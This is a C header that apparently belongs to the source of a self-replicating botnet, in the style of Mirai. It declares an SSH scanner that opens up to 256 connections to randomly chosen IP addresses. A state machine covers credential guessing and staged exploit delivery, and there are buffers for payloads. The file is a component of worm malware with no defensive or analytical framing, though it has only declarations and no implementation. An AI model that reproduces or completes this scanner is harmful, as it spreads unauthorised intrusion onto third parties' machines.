#ifdef SELFREP
#pragma once
#include <stdint.h>
#include "includes.h"
#define SSH_SCANNER_MAX_CONNS   256
#define SSH_SCANNER_RAW_PPS     788
#define SSH_SCANNER_RDBUF_SIZE  1080
#define SSH_SCANNER_HACK_DRAIN  64
struct ssh_scanner_connection
{
    int fd, last_recv;
    enum
    {
        SSH_SC_CLOSED,
        SSH_SC_CONNECTING,
        SSH_SC_SEND_BANNER,
        SSH_SC_GET_CREDENTIALS,
        SSH_SC_EXPLOIT_STAGE2,
        SSH_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[SSH_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
};
void ssh_scanner();
void ssh_kill(void);
static void ssh_setup_connection(struct ssh_scanner_connection *);
static ipv4_t get_random_ssh_ip(void);
#endif
